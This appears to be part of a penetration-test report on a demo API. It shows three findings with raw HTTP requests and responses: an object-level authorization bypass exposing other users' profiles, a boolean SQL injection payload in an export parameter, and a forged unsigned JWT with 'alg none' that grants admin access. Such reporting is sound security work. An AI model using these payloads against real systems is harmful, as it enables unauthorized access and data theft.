1. Broken object-level authorization (IDOR / BOLA)
================================================================================
Two accounts were provisioned for the test: analyst-a (user_id 4471) and
analyst-b (user_id 4472). Authenticated as analyst-a:

GET /api/v1/account/profile?user_id=4472 HTTP/1.1
Host: vulnerable-demo.test
Authorization: Bearer <analyst-a session token>
Accept: application/json

HTTP/1.1 200 OK
Content-Type: application/json

{"user_id":4472,"name":"Analyst B","email":"analyst-b@example.test",
 "phone":"+1-555-0142","role":"auditor","mfa_enabled":false}

Repeating the request with user_id=1 returned the account of the platform
administrator. No error, no audit entry observed in the account activity feed.

2. SQL injection in the report export endpoint
================================================================================
GET /api/v1/reports/export?format=csv HTTP/1.1
Host: vulnerable-demo.test
Authorization: Bearer <analyst-a session token>

HTTP/1.1 200 OK
{"rows":[...],"count":12}

Boolean payload:
GET /api/v1/reports/export?format=csv'+AND+'1'='2 HTTP/1.1
HTTP/1.1 200 OK
{"rows":[],"count":0}

GET /api/v1/reports/export?format=csv'+AND+'1'='1 HTTP/1.1
HTTP/1.1 200 OK
{"rows":[...],"count":41827}

The row count changes with the injected boolean condition, and 41827 exceeds the
records the test account owns. A time-based payload produced a 12 second delay.

================================================================================
The API issues HS256 tokens. A token was re-encoded with the alg header set to
"none" and the signature removed, and the role claim changed to "admin":

GET /api/v1/admin/users HTTP/1.1
Host: vulnerable-demo.test
Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiI0NDcxIiwicm9sZSI6ImFkbWluIn0.

HTTP/1.1 200 OK
Content-Type: application/json

{"users":[{"id":1,"email":"admin@example.test","role":"admin"}, ...]}

The unsigned token was accepted and an administrative endpoint returned data.
